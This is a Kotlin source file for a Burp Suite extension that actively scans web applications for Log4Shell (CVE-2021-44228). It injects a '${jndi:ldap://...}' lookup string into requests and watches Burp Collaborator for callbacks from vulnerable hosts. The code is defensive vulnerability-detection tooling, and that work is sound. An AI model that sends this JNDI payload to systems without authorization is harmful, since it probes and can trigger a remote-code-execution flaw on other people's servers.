/*
 * This file is part of Log4Shell scanner for Burp Suite (https://github.com/silentsignal/burp-piper)
 * Copyright (c) 2021 Andras Veres-Szentkiralyi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

package burp

import java.net.URL
import java.util.*
import java.util.concurrent.ConcurrentHashMap

const val NAME = "Log4Shell scanner"

class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {

    private lateinit var callbacks: IBurpExtenderCallbacks
    private lateinit var helpers: IExtensionHelpers
    private lateinit var collaborator: IBurpCollaboratorClientContext

    private val crontab: ConcurrentHashMap<String, Pair<IHttpRequestResponse, IntArray>> = ConcurrentHashMap()
    private val thread: Thread = object : Thread() {
        override fun run() {
            try {
                while (true) {
                    sleep(60 * 1000) // 60 seconds -- poll every minute
                    val interactions = collaborator.fetchAllCollaboratorInteractions().groupBy { it.getProperty("interaction_id") }
                    for (entry in interactions.entries) {
                        val payload = entry.key
                        val (hrr, poff) = crontab[payload] ?: continue
                        handleInteractions(hrr, poff, entry.value, sync = false).forEach(callbacks::addScanIssue)
                    }
                }
            } catch (ex: InterruptedException) {
                return
            }
        }
    }

    override fun registerExtenderCallbacks(callbacks: IBurpExtenderCallbacks) {
        this.callbacks = callbacks
        helpers = callbacks.helpers
        collaborator = callbacks.createBurpCollaboratorClientContext()

        callbacks.setExtensionName(NAME)
        callbacks.registerScannerCheck(this)
        callbacks.registerExtensionStateListener(this)
    }

    override fun doPassiveScan(baseRequestResponse: IHttpRequestResponse?): MutableList<IScanIssue> =
            Collections.emptyList() // not relevant

    override fun doActiveScan(baseRequestResponse: IHttpRequestResponse?, insertionPoint: IScannerInsertionPoint?): MutableList<IScanIssue> {
        val payload = collaborator.generatePayload(false)
        val bytes = "\${jndi:ldap://$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
        val request = insertionPoint!!.buildRequest(bytes)
        val poff = insertionPoint.getPayloadOffsets(bytes)
        val hrr = callbacks.makeHttpRequest(baseRequestResponse!!.httpService, request)
        val interactions = handleInteractions(hrr, poff,
                collaborator.fetchCollaboratorInteractionsFor(payload), sync = true)
        crontab[payload] = Pair(hrr, poff)
        synchronized(thread) {
            if (!thread.isAlive) thread.start()
        }
        return interactions
    }

    private fun handleInteractions(hrr: IHttpRequestResponse, poff: IntArray,
                                   interactions: List<IBurpCollaboratorInteraction>,
                                   sync: Boolean): MutableList<IScanIssue> {
        if (interactions.isEmpty()) return Collections.emptyList()
        val iri = helpers.analyzeRequest(hrr)
        val markers = callbacks.applyMarkers(hrr, Collections.singletonList(poff), Collections.emptyList())
        return Collections.singletonList(object : IScanIssue {
            override fun getUrl(): URL = iri.url
            override fun getIssueName(): String = "Log4Shell (CVE-2021-44228) - " + (if (sync) "synchronous" else "asynchronous")
            override fun getIssueType(): Int = 0x08000000
            override fun getSeverity(): String = "High"
            override fun getConfidence(): String = "Tentative"
            override fun getIssueBackground(): String = "See <a href=\"https://www.lunasec.io/docs/blog/log4j-zero-day/\">CVE-2021-44228</a>"
            override fun getRemediationBackground(): String? = null
            override fun getRemediationDetail(): String = "Version 2.15.0 of log4j has been released without the vulnerability." +
                    "<br><br><code>log4j2.formatMsgNoLookups=true</code> can also be set as a mitigation on affected versions."
            override fun getHttpMessages(): Array<IHttpRequestResponse> = arrayOf(markers)
            override fun getHttpService(): IHttpService = hrr.httpService
            override fun getIssueDetail(): String {
                val sb = StringBuilder("<p>The application interacted with the Collaborator server <b>")
                if (sync) {
                    sb.append("in response to")
                } else {
                    sb.append("some time after")
                }
                sb.append("</b> a request with a Log4Shell payload</p><ul>")
                for (interaction in interactions) {
                    sb.append("<li><b>")
                    sb.append(interaction.getProperty("type"))
                    sb.append("</b> at <b>")
                    sb.append(interaction.getProperty("time_stamp"))
                    sb.append("</b> from <b>")
                    sb.append(interaction.getProperty("client_ip"))
                    sb.append("</b></li>")
                }
                sb.append("</ul><p>This means that the web service (or another node in the network) is affected by this vulnerability. ")
                sb.append("However, actual exploitability might depend on an attacker-controllable LDAP server being reachable over the network.</p>")
                if (!sync) {
                    sb.append("<p>Since this interaction occurred <b>some time after the original request</b> (compare " +
                            "the <code>Date</code> header of the HTTP response vs. the interactions timestamps above), " +
                            "<b>the vulnerable code might be in another process/codebase or a completely different " +
                            "host</b> (e.g. centralized logging, SIEM). There might even be multiple instances of " +
                            "this vulnerability on different pieces of infrastructure given the nature of the bug.</p>")
                }
                return sb.toString()
            }
        })
    }

    override fun consolidateDuplicateIssues(existingIssue: IScanIssue?, newIssue: IScanIssue?): Int = 0 // TODO could be better

    override fun extensionUnloaded() {
        synchronized(thread) {
            if (thread.isAlive) {
                thread.interrupt()
            }
        }
    }
}
